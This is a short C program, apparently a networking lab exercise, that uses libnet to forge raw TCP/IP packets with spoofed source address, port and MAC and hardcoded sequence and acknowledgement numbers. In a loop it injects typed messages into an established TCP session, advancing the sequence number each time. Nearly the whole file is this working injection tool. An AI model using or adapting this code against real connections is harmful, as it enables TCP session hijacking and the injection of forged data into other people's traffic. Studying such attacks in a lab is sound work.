#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <libnet.h>

#define PORTServer 8080 
#define PORTClient 53242

#define MACCLIENT "\xa0\x36\xbc\xaa\x80\x15"
#define MACSERVER "\xa0\x36\xbc\xaa\x80\x15"

#define IPClient "192.168.1.166"
#define IPServer "192.168.1.166"

#define ACK 0x67c5d0d7
#define SQ 0xad9485d2
// Accumulators for ID number and sequence number
int accSeq = 5;



// Send a fake packet to the server
void faker(){
    int ID = 0xe2ec;
    
    while(1){
        // Get the message
        char message[256];
        printf("Escribe un mensaje a enviar: ");
        fgets(message, sizeof(message), stdin);
        int len = strlen(message);
        
        if(strncmp(message, "exit", 4) == 0){
            break;
        }

        // Create a libnet handle
        libnet_t *l;
        l = libnet_init(LIBNET_RAW4, NULL, NULL);
        
        // Get the IP addresses
        uint32_t src_ip = libnet_name2addr4(l, IPClient, LIBNET_RESOLVE);
        uint32_t dst_ip = libnet_name2addr4(l, IPServer, LIBNET_RESOLVE);

        //Get the MAC addresses
        uint8_t MACClient[6], MACServer[6];
       

        // Build the TCP packet
        libnet_build_tcp(
            PORTClient,         //Client Port
            PORTServer,         //Server Port
            SQ + accSeq,            //Sequence Number
            ACK,                //Acknowledge Number
            TH_PUSH | TH_ACK,   //Control Flags
            1024,                //Window Size
            0,                  //Checksum
            0,                  //Urgent Pointer
            LIBNET_TCP_H,       //Header Length
            (uint8_t*) message, //Payload
            len,    //Payload Length
            l,                  //Libnet Handle
            0                   //Protocol Tag
        );

        // Build the IP packet
        libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H + strlen(message), //Total Length of the Packet
            0,                  //Type of Service
            ++ID,         //Identification
            0,                  //Fragmentation
            64,                 //Time to Live
            IPPROTO_TCP,        //Protocol
            0,                  //Checksum
            src_ip,           //Source IP
            dst_ip,           //Destination IP
            NULL,               //Payload
            0,                  //Payload Length
            l,                  //Libnet Handle
            0                   //Protocol Tag
        );

        // Build the Ethernet packet
        libnet_build_ethernet(
            (uint8_t *)MACSERVER,  // MAC destino
            (uint8_t *)MACCLIENT,        //Source MAC
            ETHERTYPE_IP,       //Ethernet Type
            NULL,               //Payload
            0,                  //Payload Length
            l,                  //Libnet Handle
            0                   //Protocol Tag
        );

        // Write the packet to the wire
        libnet_write(l);

        // Increment the ID and sequence number
        accSeq += len;
    }
}

int main(){
    faker();

}